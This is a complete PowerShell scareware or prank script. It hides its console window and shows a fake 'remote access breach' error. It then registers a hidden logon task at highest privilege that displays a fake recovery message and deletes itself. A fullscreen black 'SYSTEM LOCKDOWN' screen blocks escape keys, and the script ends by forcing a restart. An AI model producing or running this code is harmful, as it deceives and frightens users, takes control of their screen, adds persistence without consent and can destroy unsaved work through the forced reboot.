Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell window
$hwnd = Get-Process -Id $PID | ForEach-Object { $_.MainWindowHandle }
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
[Win]::ShowWindow($hwnd, 0)

# Step 1: Fake critical error popup
Start-Sleep -Milliseconds 300
[System.Windows.Forms.MessageBox]::Show(
    "Critical system error: 0x0000DEAD`nRemote access breach detected!",
    "System Failure",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Error
)

# Step 2: Prepare scheduled task to show recovery message at next logon BEFORE blackout

$scriptPath = "$env:temp\ShowRecoveryMessage.ps1"
$scriptContent = @"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    'System recovery successful.`nAll systems operational.',
    'Recovery Status',
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Information
)
# Remove the scheduled task after running once
schtasks /Delete /TN ShowRecoveryMessage /F
Remove-Item -Path `"$scriptPath`" -Force
"@

Set-Content -Path $scriptPath -Value $scriptContent -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "ShowRecoveryMessage" -Action $action -Trigger $trigger -RunLevel Highest -Force

# Step 3: Blackout fullscreen lockdown screen

$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.BackColor = 'Black'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.KeyPreview = $true
$form.ShowInTaskbar = $false

$label = New-Object System.Windows.Forms.Label
$label.Dock = 'Fill'
$label.ForeColor = 'Red'
$label.Font = 'Arial, 42pt, style=Bold'
$label.TextAlign = 'MiddleCenter'
$label.Text = "SYSTEM LOCKDOWN IN PROGRESS`nPLEASE REMAIN CALM"
$form.Controls.Add($label)

$form.Add_KeyDown({
    if ($_.KeyCode -in @("Escape", "Tab", "F4", "Alt", "Control")) {
        $_.Handled = $true
        $_.SuppressKeyPress = $true
    }
})

$form.Show()

# Step 4: Start restart job 2 seconds before blackout ends
$restartJob = Start-Job -ScriptBlock {
    Start-Sleep -Seconds 6
    Restart-Computer -Force
}

for ($i = 0; $i -lt 8; $i++) {
    Start-Sleep -Seconds 1
    [System.Windows.Forms.Application]::DoEvents()
}

$form.Close()

# Wait shortly for the job, then cleanup (likely PC restarts immediately)
Wait-Job $restartJob -Timeout 5 | Out-Null
Remove-Job $restartJob
